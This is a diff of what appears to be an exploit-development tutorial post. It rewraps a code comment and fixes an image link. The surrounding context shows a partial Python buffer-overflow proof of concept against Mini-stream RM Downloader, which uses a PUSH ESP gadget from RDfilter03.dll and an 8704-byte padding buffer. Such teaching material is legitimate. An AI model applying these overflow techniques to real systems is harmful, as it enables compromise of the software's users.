@@ -41,7 +41,8 @@ Current poc:
 ```term
 import struct 
 
-pushesp = struct.pack("<I", 0x1003DF53) #   0x1003df53 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\RM Downloader\RDfilter03.dll)
+pushesp = struct.pack("<I", 0x1003DF53) #   0x1003df53 : "\x54\xC3" |  {PAGE_EXECUTE_READ} [RDfilter03.dll] ASLR: False, Rebase: False, 
+SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Mini-stream\RM Downloader\RDfilter03.dll)
 
 buffer = "A" * 8704 + pushesp + "\xff" * 200
 
@@ -52,6 +53,6 @@ f.close()
 
 Once the script is run and the explotation process is completed, the debugger greets us with the following result:
 
-[]!(/assets/img/Alignments/1.png)
+![](/assets/img/Alignments/1.png)
 
 It is important to note the values of the ESP and EIP registers, as they have been aligned by the PUSH ESP instruction.
